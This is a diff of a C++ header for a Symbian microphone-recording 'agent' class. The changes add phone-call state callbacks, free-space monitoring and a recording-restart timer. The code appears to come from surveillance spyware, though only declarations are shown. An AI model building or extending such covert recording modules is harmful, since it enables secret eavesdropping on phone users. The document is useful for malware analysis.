@@ -18,10 +18,13 @@
 // INCLUDES
 #include "AbstractAgent.h"
 #include "AdditionalDataStructs.h"
+#include "SlimMonitorPhoneCall.h"
+#include "MonitorFreeSpace.h"
 #include <MdaAudioInputStream.h>
 #include <mda\common\audio.h>
 #include <mmf\common\mmfutilities.h>
-
+#include <HT\Logging.h>
+#include <HT\TimeOutTimer.h>
 
 
 // CLASS DECLARATION
@@ -30,7 +33,7 @@
  *  CAgentMic
  * 
  */
-class CAgentMic : public CAbstractAgent, public MMdaAudioInputStreamCallback
+class CAgentMic : public CAbstractAgent, public MMdaAudioInputStreamCallback, public MSlimCallMonCallBack, public MTimeOutNotifier, public MFreeSpaceCallBack
 	{
 public:
 	// Constructors and destructor
@@ -69,6 +72,18 @@ private:
 	 */
 	void ConstructL(const TDesC8& params);
 	
+	// From MSlimCallMonCallBack
+	virtual void NotifyIdle();
+	virtual void NotifyDialling();
+	virtual void NotifyRinging();
+
+	// From MFreeSpaceCallBack
+	virtual void NotifyAboveThreshold();
+	virtual void NotifyBelowThreshold();
+	
+	// From MTimeOutNotifier
+	virtual void TimerExpiredL(TAny* src);
+	    
 	/*
 	 * MaiscOpenComplete()
 	 *
@@ -96,11 +111,9 @@ private:
 	 */ 
 	virtual void MaiscRecordComplete(TInt aError);
 		
-	/*
-	 * Used to convert Symbian time into Windows filetime.
-	 */
-	//TInt64 GetFiletime(TTime aCurrentUtcTime);
 
+	void RestartRecording();
+	
 private: // data members
 	TBool iVadActive;
 	TUint32 iVadThreshold;
@@ -119,8 +132,20 @@ private: // data members
 	// Frames counter
 	TInt iFramesCounter;
 	
+	//TBool iErrDied;    //TODO: verify and delete when no more needed
+	//TInt iStreamCounter;  //TODO: verify and delete when no more needed
+	//TBool iInCall;
+	
 	TMicAdditionalData iMicAdditionalData;  
-			
+	
+	CFreeSpaceMonitor*		iFreeSpaceMonitor;
+	TBool  iBelowQuota;
+	CSlimPhoneCallMonitor*	iCallMonitor;
+	CTimeOutTimer* 	iTimer;
+	
+	
+	
+	__FLOG_DECLARATION_MEMBER
 	};
 
 
